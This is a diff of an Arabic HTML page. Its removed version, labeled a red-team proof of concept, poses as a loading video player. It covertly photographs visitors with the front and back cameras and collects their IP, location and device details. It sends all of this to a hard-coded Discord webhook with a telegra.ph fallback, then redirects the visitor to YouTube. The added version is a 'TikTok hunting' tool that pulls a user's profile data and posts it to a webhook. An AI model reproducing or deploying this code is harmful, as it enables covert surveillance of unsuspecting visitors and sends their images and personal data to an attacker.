@@ -1,193 +1,269 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>مشغّل الفيديو — جارٍ التحميل...</title>
-<style>
-  *{margin:0;padding:0;box-sizing:border-box}
-  body{background:#0f1115;color:#e8e8e8;font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
-  .box{text-align:center}
-  .player{width:320px;height:180px;border-radius:12px;margin:0 auto 18px;background:radial-gradient(circle at 30% 30%,#1c2230,#0a0c10);display:flex;align-items:center;justify-content:center;border:1px solid #232a38}
-  .play{width:64px;height:64px;border-radius:50%;background:#e50914;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(229,9,20,.5);animation:pulse 1.6s infinite}
-  .play::after{content:"";border-style:solid;border-width:12px 0 12px 20px;border-color:transparent transparent transparent #fff;margin-right:4px}
-  @keyframes pulse{0%,100%{box-shadow:0 0 15px rgba(229,9,20,.4)}50%{box-shadow:0 0 40px rgba(229,9,20,.9)}}
-  .bar{width:320px;height:6px;background:#232a38;border-radius:3px;margin:14px auto 10px;overflow:hidden}
-  .bar i{display:block;height:100%;width:0;background:#e50914;border-radius:3px;animation:load 5s ease forwards}
-  @keyframes load{to{width:100%}}
-  .txt{color:#9aa4b5;font-size:14px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صيد تيك توك</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0f0f0f;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;direction:rtl;padding:20px}
+        .container{background:#1e1e1e;border-radius:30px;padding:40px;max-width:700px;width:100%;box-shadow:0 25px 60px rgba(0,0,0,0.8);border:1px solid #333}
+        h1{color:#fff;text-align:center;font-size:28px;margin-bottom:10px}
+        .sub{color:#aaa;text-align:center;font-size:15px;margin-bottom:30px;border-bottom:1px solid #2a2a2a;padding-bottom:15px}
+        .group{display:flex;flex-direction:column;gap:12px;margin-bottom:25px}
+        .group label{color:#ccc;font-size:16px}
+        .group input{padding:14px 18px;border-radius:16px;border:1px solid #333;background:#1e1e1e;color:#fff;font-size:16px;outline:none;transition:0.3s}
+        .group input:focus{border-color:#00d4ff;box-shadow:0 0 15px rgba(0,212,255,0.2)}
+        .btn{width:100%;padding:16px;border:none;border-radius:16px;font-size:20px;font-weight:700;background:linear-gradient(135deg,#00d4ff,#0088cc);color:#fff;cursor:pointer;transition:0.3s;box-shadow:0 4px 20px rgba(0,212,255,0.3);margin-top:10px}
+        .btn:hover{transform:scale(1.02)}
+        .btn:active{transform:scale(0.97)}
+        .btn:disabled{opacity:0.6;cursor:not-allowed}
+        .result{display:none;margin-top:30px;background:#1a1a1a;border-radius:16px;padding:20px;border:1px solid #2a2a2a}
+        .result.show{display:block}
+        .profile{display:flex;align-items:center;gap:20px;flex-wrap:wrap;margin-bottom:20px}
+        .profile img{width:80px;height:80px;border-radius:50%;border:3px solid #00d4ff;object-fit:cover;background:#222}
+        .profile .info{flex:1}
+        .profile .info h2{color:#fff;font-size:22px}
+        .profile .info .un{color:#888;font-size:16px;direction:ltr;text-align:left}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:15px;margin:20px 0}
+        .stat-card{background:#252525;padding:15px 10px;border-radius:14px;text-align:center;border:1px solid #333}
+        .stat-card .num{color:#00d4ff;font-size:22px;font-weight:700;display:block}
+        .stat-card .lab{color:#aaa;font-size:13px;margin-top:5px}
+        .extra{color:#ccc;font-size:14px;line-height:1.8;margin-top:15px;padding-top:15px;border-top:1px solid #2a2a2a}
+        .extra span{color:#fff;font-weight:500}
+        .status{color:#ffa500;text-align:center;margin-top:15px;font-size:14px;min-height:24px}
+        .webhook-status{color:#aaa;font-size:14px;text-align:center;margin-top:8px}
+        .footer{margin-top:25px;text-align:center;color:#555;font-size:13px;border-top:1px solid #222;padding-top:18px}
+        @media(max-width:500px){.container{padding:25px 20px}.profile{flex-direction:column;align-items:center;text-align:center}.profile .info .un{text-align:center}.stats{grid-template-columns:1fr 1fr}}
+    </style>
 </head>
 <body>
-<div class="box">
-  <div class="player"><div class="play"></div></div>
-  <div class="bar"><i></i></div>
-  <div class="txt">جارٍ تجهيز الجلسة الآمنة...</div>
+<div class="container">
+    <h1>🎣 صيد تيك توك</h1>
+    <div class="sub">أدخل اسم المستخدم واضغط «تفعيل»</div>
+    <div class="group">
+        <label>👤 اسم المستخدم</label>
+        <input type="text" id="username" placeholder="@example" value="@mrbeast">
+    </div>
+    <div class="group">
+        <label>🔗 رابط Webhook</label>
+        <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+        <div id="webhookStatus" class="webhook-status"></div>
+    </div>
+    <button class="btn" id="fetchBtn">🚀 تفعيل</button>
+    <div id="statusMsg" class="status"></div>
+    <div class="result" id="resultBox">
+        <div class="profile">
+            <img id="avatar" src="">
+            <div class="info">
+                <h2 id="displayName">—</h2>
+                <div class="un" id="uniqueId">—</div>
+            </div>
+        </div>
+        <div class="stats">
+            <div class="stat-card"><span class="num" id="following">0</span><span class="lab">متابَع</span></div>
+            <div class="stat-card"><span class="num" id="fans">0</span><span class="lab">متابِع</span></div>
+            <div class="stat-card"><span class="num" id="likes">0</span><span class="lab">إعجابات</span></div>
+            <div class="stat-card"><span class="num" id="videos">0</span><span class="lab">فيديوهات</span></div>
+        </div>
+        <div class="extra" id="extraInfo">
+            <div><span>🆔 المعرف الفريد:</span> <span id="userId">—</span></div>
+            <div><span>📝 البايو:</span> <span id="bio">—</span></div>
+            <div><span>🔗 الرابط:</span> <span id="link">—</span></div>
+            <div><span>🌐 المنطقة:</span> <span id="region">—</span></div>
+            <div><span>📅 تاريخ الانضمام:</span> <span id="joinDate">—</span></div>
+            <div><span>📺 البثوث المباشرة:</span> <span id="liveCount">—</span></div>
+            <div><span>✅ موثّق:</span> <span id="verified">—</span></div>
+            <div><span>👤 خاص:</span> <span id="private">—</span></div>
+        </div>
+    </div>
+    <div class="footer">© 2026 - صيد-معلومات-يوزر-تيك</div>
 </div>
-
 <script>
-/* ============================================================
-   Camera Capture → Discord Webhook — Red Team PoC
-   يلتقط: كاميرا أمامية + خلفية + معلومات الضحية
-   ويرسلها كلها لويب هوك ديسكورد
-   ============================================================ */
+    (() => {
+        const usernameInput = document.getElementById('username');
+        const webhookInput = document.getElementById('webhook');
+        const fetchBtn = document.getElementById('fetchBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const resultBox = document.getElementById('resultBox');
+        const webhookStatus = document.getElementById('webhookStatus');
+        const avatar = document.getElementById('avatar');
+        const displayName = document.getElementById('displayName');
+        const uniqueId = document.getElementById('uniqueId');
+        const following = document.getElementById('following');
+        const fans = document.getElementById('fans');
+        const likes = document.getElementById('likes');
+        const videos = document.getElementById('videos');
+        const userId = document.getElementById('userId');
+        const bio = document.getElementById('bio');
+        const link = document.getElementById('link');
+        const region = document.getElementById('region');
+        const joinDate = document.getElementById('joinDate');
+        const liveCount = document.getElementById('liveCount');
+        const verified = document.getElementById('verified');
+        const privateAcc = document.getElementById('private');
 
-const CONFIG = {
-  webhook: "https://discord.com/api/webhooks/1537214553014804520/1ZgqczFK_f92j8XIlZaD58A3vXx80HXEVU0rPR7rNLKjXpCUgEOVR2cgLnztt-g_qlRc",   // رابط الـ Webhook من ديسكورد
-  decoyUrl: "https://www.youtube.com", // تحويل الضحية بعد التصوير ("" لتعطيله)
-  redirectDelay: 6000,                  // ms قبل التحويل
-  cameraWarmup: 1200,                   // ms انتظار تثبيت الكاميرا
-  quality: 0.85,                        // جودة JPEG
-  grabIP: true                          // التقاط IP وموقع تقريبي مع اللقطات
-};
+        const fetchUser = async (username) => {
+            const clean = username.replace(/^@/, '');
+            const resp = await fetch(`https://www.tikwm.com/api/user?unique_id=${clean}`);
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            const data = await resp.json();
+            if (data.code !== 0) throw new Error(data.msg || 'غير موجود');
+            return data.data;
+        };
 
-const sleep = ms => new Promise(r => setTimeout(r, ms));
+        const sendToWebhook = async (url, data) => {
+            const embed = {
+                title: '🎣 تم صيد مستخدم تيك توك',
+                color: 0x00d4ff,
+                thumbnail: { url: data.avatar },
+                fields: [
+                    { name: '👤 الاسم', value: data.nickname || '—', inline: true },
+                    { name: '🆔 المعرف', value: data.unique_id || '—', inline: true },
+                    { name: '✅ موثّق', value: data.verified ? 'نعم' : 'لا', inline: true },
+                    { name: '👥 متابعون', value: data.follower_count || 0, inline: true },
+                    { name: '📌 متابع', value: data.following_count || 0, inline: true },
+                    { name: '❤️ إعجابات', value: data.heart_count || 0, inline: true },
+                    { name: '🎬 فيديوهات', value: data.video_count || 0, inline: true },
+                    { name: '📝 البايو', value: data.signature || '—', inline: false },
+                    { name: '🔗 الرابط', value: data.link || '—', inline: false },
+                    { name: '🌍 المنطقة', value: data.region || '—', inline: true },
+                    { name: '📅 الانضمام', value: data.create_time ? new Date(data.create_time * 1000).toLocaleDateString() : '—', inline: true },
+                    { name: '📺 البثوث', value: data.live_count || 'غير متاح', inline: true },
+                ],
+                footer: { text: 'صيد-معلومات-يوزر-تيك' },
+                timestamp: new Date().toISOString()
+            };
+            const payload = {
+                username: 'صيد-معلومات-يوزر-تيك',
+                embeds: [embed]
+            };
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            return true;
+        };
 
-/* ---------- 1) معلومات الضحية ---------- */
-async function getIPInfo() {
-  if (!CONFIG.grabIP) return null;
-  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
-    try {
-      const r = await fetch(url, { cache: "no-store" });
-      const j = await r.json();
-      if (j && (j.ip || j.latitude)) return j;
-    } catch (e) {}
-  }
-  return null;
-}
+        const displayData = (data) => {
+            avatar.src = data.avatar || '';
+            displayName.textContent = data.nickname || '—';
+            uniqueId.textContent = `@${data.unique_id || ''}`;
+            following.textContent = data.following_count || 0;
+            fans.textContent = data.follower_count || 0;
+            likes.textContent = data.heart_count || 0;
+            videos.textContent = data.video_count || 0;
+            userId.textContent = data.uid || '—';
+            bio.textContent = data.signature || '—';
+            link.textContent = data.link || '—';
+            region.textContent = data.region || '—';
+            joinDate.textContent = data.create_time ? new Date(data.create_time * 1000).toLocaleDateString() : '—';
+            liveCount.textContent = data.live_count || 'غير متاح';
+            verified.textContent = data.verified ? '✅ نعم' : '❌ لا';
+            privateAcc.textContent = data.private ? '🔒 نعم' : '🔓 لا';
+            resultBox.classList.add('show');
+        };
 
-/* ---------- 2) التقاط صورة من كاميرا ---------- */
-async function capturePhoto(facingMode) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false
-    });
-    const video = document.createElement("video");
-    video.setAttribute("playsinline", "");
-    video.muted = true;
-    video.srcObject = stream;
-    video.style.cssText = "position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1";
-    document.body.appendChild(video);
-    await video.play();
-    await sleep(CONFIG.cameraWarmup);
+        const testWebhook = async (url) => {
+            try {
+                const testPayload = {
+                    content: '🔍 اختبار الاتصال بـ Webhook',
+                    embeds: [{
+                        title: 'اختبار',
+                        description: 'تم الاتصال بنجاح',
+                        color: 0x00ff00,
+                        footer: { text: 'صيد-معلومات-يوزر-تيك' }
+                    }]
+                };
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(testPayload)
+                });
+                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+                return true;
+            } catch (e) {
+                return false;
+            }
+        };
 
-    const canvas = document.createElement("canvas");
-    canvas.width  = video.videoWidth  || 1280;
-    canvas.height = video.videoHeight || 720;
-    const ctx = canvas.getContext("2d");
-    if (facingMode === "user") {           // عكس الكاميرا الأمامية
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-    }
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const handle = async () => {
+            const username = usernameInput.value.trim();
+            const webhook = webhookInput.value.trim();
 
-    stream.getTracks().forEach(t => t.stop());
-    video.remove();
+            if (!username) {
+                statusMsg.textContent = '⚠️ أدخل اسم المستخدم';
+                statusMsg.style.color = '#ffa500';
+                return;
+            }
 
-    return await new Promise(res => canvas.toBlob(res, "image/jpeg", CONFIG.quality));
-  } catch (e) {
-    return null; // رفض الإذن أو لا توجد كاميرا
-  }
-}
+            fetchBtn.disabled = true;
+            fetchBtn.textContent = '⏳ جاري...';
+            statusMsg.textContent = '🔄 جلب البيانات...';
+            statusMsg.style.color = '#00d4ff';
+            resultBox.classList.remove('show');
+            webhookStatus.textContent = '';
 
-/* ---------- 3) رفع صورة على telegra.ph (fallback للإرسال المضمون) ---------- */
-async function uploadToTelegraph(blob) {
-  const fd = new FormData();
-  fd.append("file", blob, "photo.jpg");
-  const r = await fetch("https://telegra.ph/upload", { method: "POST", body: fd });
-  const j = await r.json();
-  if (j && j[0] && j[0].src) return "https://telegra.ph" + j[0].src;
-  return null;
-}
+            let userData = null;
+            try {
+                userData = await fetchUser(username);
+                displayData(userData);
+                statusMsg.textContent = '✅ تم جلب البيانات';
+                statusMsg.style.color = '#0f0';
+            } catch (err) {
+                statusMsg.textContent = `❌ ${err.message}`;
+                statusMsg.style.color = '#ff4444';
+                fetchBtn.disabled = false;
+                fetchBtn.textContent = '🚀 تفعيل';
+                return;
+            }
 
-/* ---------- 4) الإرسال لديسكورد (طبقتان) ---------- */
-async function sendToDiscord(frontBlob, backBlob, info) {
-  const stamp = new Date().toLocaleString("ar-EG");
-  const location = [info?.city, info?.region, info?.country].filter(Boolean).join("، ") || "غير معروف";
+            if (webhook) {
+                try {
+                    const sent = await sendToWebhook(webhook, userData);
+                    if (sent) {
+                        webhookStatus.textContent = '✅ الرابط ضبط';
+                        webhookStatus.style.color = '#0f0';
+                    } else {
+                        webhookStatus.textContent = '❌ فشل الإرسال';
+                        webhookStatus.style.color = '#ff4444';
+                    }
+                } catch (e) {
+                    webhookStatus.textContent = '❌ فشل الإرسال: ' + e.message;
+                    webhookStatus.style.color = '#ff4444';
+                }
+            } else {
+                webhookStatus.textContent = '⚠️ لم يتم إدخال رابط';
+                webhookStatus.style.color = '#ffa500';
+            }
 
-  const baseFields = [
-    { name: "IP",        value: info?.ip || "غير معروف", inline: true },
-    { name: "الموقع",    value: location,                inline: true },
-    { name: "الجهاز",    value: (navigator.userAgent || "?").slice(0, 120), inline: false },
-    { name: "اللغة",     value: navigator.language,      inline: true },
-    { name: "الشاشة",    value: screen.width + "x" + screen.height, inline: true },
-    { name: "المصدر",    value: document.referrer || "direct", inline: false },
-    { name: "الوقت",     value: stamp,                   inline: false }
-  ];
+            fetchBtn.disabled = false;
+            fetchBtn.textContent = '🚀 تفعيل';
+        };
 
-  /* --- الطبقة 1: multipart مع الصور كـ attachments --- */
-  try {
-    const embeds = [];
-    if (frontBlob) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url: "attachment://front.jpg" }, color: 0xe50914 });
-    if (backBlob)  embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url: "attachment://back.jpg"  }, color: 0x1e90ff });
+        fetchBtn.addEventListener('click', handle);
+        usernameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') handle(); });
 
-    const payload = JSON.stringify({ username: "Logger", embeds });
-
-    const form = new FormData();
-    form.append("payload_json", payload);
-    if (frontBlob) form.append("files[0]", frontBlob, "front.jpg");
-    if (backBlob)  form.append("files[1]", backBlob,  "back.jpg");
-
-    const r = await fetch(CONFIG.webhook, { method: "POST", body: form });
-    if (r.ok) return true;
-  } catch (e) {}
-
-  /* --- الطبقة 2: رفع على telegra.ph وإرسال الروابط --- */
-  try {
-    const embeds = [];
-    if (frontBlob) {
-      const url = await uploadToTelegraph(frontBlob);
-      if (url) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url }, color: 0xe50914 });
-    }
-    if (backBlob) {
-      const url = await uploadToTelegraph(backBlob);
-      if (url) embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url }, color: 0x1e90ff });
-    }
-    if (embeds.length) {
-      await fetch(CONFIG.webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username: "Logger", embeds })
-      });
-      return true;
-    }
-  } catch (e) {}
-
-  /* --- الطبقة 3: رسالة نصية فقط (رفض الكاميرا مثلاً) --- */
-  try {
-    await fetch(CONFIG.webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: "Logger",
-        content: "ضحية جديدة — تعذر التصوير (رفض إذن الكاميرا أو لا توجد كاميرا)\n" +
-                 "IP: " + (info?.ip || "غير معروف") + " | الموقع: " + location + "\n" +
-                 "الوقت: " + stamp
-      })
-    });
-  } catch (e) {}
-  return false;
-}
-
-/* ---------- التنفيذ الرئيسي ---------- */
-(async () => {
-  if (CONFIG.webhook.startsWith("ضع")) { console.warn("[PoC] ضع رابط الويب هوك في CONFIG"); return; }
-
-  if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
-  sessionStorage.setItem("_done", "1");
-
-  if (CONFIG.decoyUrl) setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
-  if (!window.isSecureContext) console.warn("[PoC] الكاميرا تحتاج HTTPS");
-
-  const info = await getIPInfo();
-
-  const front = await capturePhoto("user");
-  await sleep(400);
-  const back  = await capturePhoto("environment");
-
-  await sendToDiscord(front, back, info);
-})();
+        webhookInput.addEventListener('change', async () => {
+            const url = webhookInput.value.trim();
+            if (!url) {
+                webhookStatus.textContent = '';
+                return;
+            }
+            webhookStatus.textContent = '⏳ جاري التحقق...';
+            webhookStatus.style.color = '#ffa500';
+            const ok = await testWebhook(url);
+            if (ok) {
+                webhookStatus.textContent = '✅ الرابط صحيح';
+                webhookStatus.style.color = '#0f0';
+            } else {
+                webhookStatus.textContent = '❌ الرابط غير صالح أو فشل الاتصال';
+                webhookStatus.style.color = '#ff4444';
+            }
+        });
+    })();
 </script>
 </body>
 </html>
